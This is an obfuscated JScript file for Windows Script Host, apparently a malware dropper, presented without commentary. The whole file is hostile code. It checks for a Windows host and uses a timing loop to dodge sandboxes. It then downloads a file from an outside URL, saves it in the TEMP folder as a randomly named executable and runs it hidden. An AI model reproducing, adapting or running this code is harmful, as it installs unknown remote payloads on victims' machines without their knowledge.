var h = false;
var O = "CreateObject";
var yF = function J() {return WScript[O]("WScript.Shell");}(), v = 11;
var l = "MSXML2.XMLHTTP";
var J0 = 2123213;
var DU = 0;
function k(hR){yF["Run"](hR, DU, DU);};
function D(){return "" + l;};
function Hl(wW, d){DU = DU * 1; return wW - d;};
function o(){return O;};
/*@cc_on
  @if (@_win32 || @_win64)
    h = true;
  @end
@*/
if (h)
{
var t = "";
function pF(){return 22;};
var r = 0; var O0 = 0;
function qT()
{
var R = new this["Date"]();
var Kd = R["getUTCMilliseconds"]();
WScript["Sleep"](pF());
var R = new this["Date"]();
var jM = R["getUTCMilliseconds"]();
WScript["Sleep"](pF());
var R = new this["Date"]();
var LM = R["getUTCMilliseconds"]();
var r = "bV";
r = Hl(jM, Kd);
var O0 = "jr";
O0 = Hl(LM, jM);
t = "open";
return Hl(r, O0);
}
var ru = false;
var P = false;
for (var Vi = DU; Vi < pF() * 1; Vi++){if (qT() != DU){
ru = true; 
O0 = "31" + 11 * r + O0; 
P = true; 
break;
}}
function e() {return ((ru == true) && (ru == P)) ? 1 : DU;};
if (ru && e() && P){
function dl() {return yF["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "OGm9xdtebOD4gz3J.exe";};
 f0 = D();
 Wy = WScript[O](f0);
 var x = 1;
 while (x){
try {
Wy[t]("GET", "http://pasticceriabonci.it/m1psa", false);
Wy["send"]();
g = "Sleep";
for (;;){WScript[g](pF() * 11); if (Wy["readystate"] >= 2 * 2) break;};
x = DU;
} catch(f){};
}
function U(a) {var qW = (1, 2, 3, 4, 5, a); return qW;};
IG = WScript[o()]("ADODB.Stream");
f0 = IG;
f0[t]();
f0["type"] = U(1);
f0["write"](Wy["ResponseBody"]);
IG["position"] = U(DU);
f0["Save" + "ToFile"](dl(), 2);
IG["c"+"lose"]();
Y = dl();
k(Y);
}
}

